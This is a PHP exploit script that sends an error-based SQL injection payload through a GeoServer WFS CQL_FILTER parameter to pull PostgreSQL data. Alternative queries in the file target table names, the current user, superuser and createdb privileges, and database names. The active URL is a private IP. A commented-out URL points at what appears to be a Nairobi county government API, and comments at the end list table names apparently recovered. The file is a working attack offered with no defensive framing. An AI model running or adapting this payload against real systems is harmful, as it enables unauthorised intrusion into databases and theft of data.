<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

$sql = "SELECT `tablename` FROM `pg_tables` WHERE `tableowner` = `postgres` LIMIT 1 OFFSET 1";
//$sql = 'SELECT current_user';
//$sql = 'SELECT usesuper FROM pg_user LIMIT 1 OFFSET 5';
//$sql = 'SELECT usecreatedb FROM pg_user LIMIT 1 OFFSET 5';
//$sql = 'SELECT datname FROM pg_database LIMIT 1 OFFSET 20';

$cql_filter = "strStartsWith(applicat_4,'x'') = true and 1=(SELECT CAST ((".$sql.") AS INTEGER)) -- ') = true";
//$cql_filter = "strStartsWith(applicat_4,'x'') = true and 1=('.$sql.') -- ') = true";
$cql_filter = urlencode($cql_filter);
$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/ows?version=1.0.0&request=GetFeature&service=wfs&typeName=npdms%3Aam_few_advert_structures&CQL_FILTER='.$cql_filter,
  //CURLOPT_URL => 'https://edev.nairobiservices.go.ke/api/maps/geoserver/ows?version=1.0.0&request=GetFeature&service=wfs&typeName=npdms%3Aam_few_advert_structures&CQL_FILTER='.$cql_filter,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$response = curl_exec($curl);

curl_close($curl);
echo $response;

/*
starehe_parcels
au_nairobi_subcounty_unit

*/